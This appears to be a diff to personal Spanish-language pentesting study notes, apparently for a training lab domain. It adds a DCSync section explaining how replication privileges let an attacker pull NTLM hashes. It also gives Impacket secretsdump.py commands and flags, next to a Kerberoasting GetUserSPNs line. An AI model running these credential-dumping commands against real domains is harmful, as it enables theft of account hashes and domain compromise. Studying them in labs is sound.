@@ -122,3 +122,27 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request-us
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request-user <user TGS> -outpuitfile <name>
 #Output a un file
 
+----------  ----------  ----------  ----------
+	### DCSync
+Version windows es "From_windows" directory
+
+Es una tecnica que intenta roban la contraseña de la base de datos de AD mediante Directory Replication Service Remote Protocol que es usado por el dominio para replicar la info de este.
+La idea es que el DC nos brinde los hashes NTLM
+Se necesita cuenta de usuario con privilegios: Replicating Directory Changes and Replicating Directory Changes All permissions set
+
+##Impacket secretdump
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/<user>@172.16.5.5 
+#Podemos usar secrets dump de impacket para obtener los hashes NTLM del usuario
+
+Flags interesantes
+-just-dc-ntlm
+#Si nos interesa solo obtener el hash NTLM
+-just-dc-user <USERNAME>
+#Si nos interesa solo obtener la dataa de un usuario en particular
+-pwd-last-set
+#Cuando fue el ultimo cambio de la contraseña
+-history
+#Para obtener el historial de contraseñas
+-user-status
+#Nos permite saber si el usuario esta habilitado
+
